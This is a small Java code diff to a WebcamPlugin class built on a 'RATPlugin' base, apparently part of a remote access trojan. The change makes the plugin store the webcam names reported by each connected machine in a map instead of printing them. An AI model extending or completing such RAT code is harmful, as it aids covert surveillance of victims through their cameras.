@@ -90,7 +90,7 @@ public class WebcamPlugin extends RATPlugin {
 			
 			for (int i = 0; i < len; i++) {
 				webcams.add(WebcamPlugin.readString(event.getServer().getDataReader()));
-				System.out.println(webcams.get(i));
+				map.put(event.getServer(), webcams);
 			}
 		}
 	}
